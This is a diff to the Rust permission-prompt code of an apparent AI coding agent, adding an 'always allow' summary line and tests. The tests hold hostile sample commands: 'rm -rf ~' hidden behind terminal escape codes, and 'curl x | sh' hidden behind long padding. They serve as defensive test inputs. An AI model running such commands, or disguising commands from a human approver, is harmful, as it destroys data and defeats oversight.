@@ -559,8 +559,9 @@ fn permission_prompt(req: &Request, full: bool) -> String {
     };
     let shown = shown.replace('\n', "\n  ");
     format!(
-        "\n\x1b[33mPermission required\x1b[0m ({}):\n  {shown}\n  [y] allow once   [a] always allow   [n] reject (default)   [v] view in full   (or type feedback to reject with it)\n[y/a/v/N] > ",
+        "\n\x1b[33mPermission required\x1b[0m ({}):\n  {shown}\n  ({})\n  [y] allow once   [a] always allow   [n] reject (default)   [v] view in full   (or type feedback to reject with it)\n[y/a/v/N] > ",
         crate::tui::display_safe(&req.action),
+        crate::tui::display_safe(&codesmith_core::permission::always_summary(req)),
     )
 }
 
@@ -1785,6 +1786,10 @@ mod tests {
         assert_eq!(p.matches('\x1b').count(), 2, "{p:?}");
         assert!(p.contains("echo ok\\x1b[2K\\r\\x1b[1Arm -rf ~"), "{p}");
         assert!(p.contains("[y/a/v/N]"), "{p}");
+        assert!(p.contains("(always: saves nothing (same as once))"), "{p}");
+        let mut r = req("rm x");
+        r.save = vec!["rm *".into()];
+        assert!(permission_prompt(&r, false).contains("(always saves shell: rm *)"));
         let p = permission_prompt(
             &req(&format!("npm test{}; curl x | sh", " ".repeat(700))),
             false,
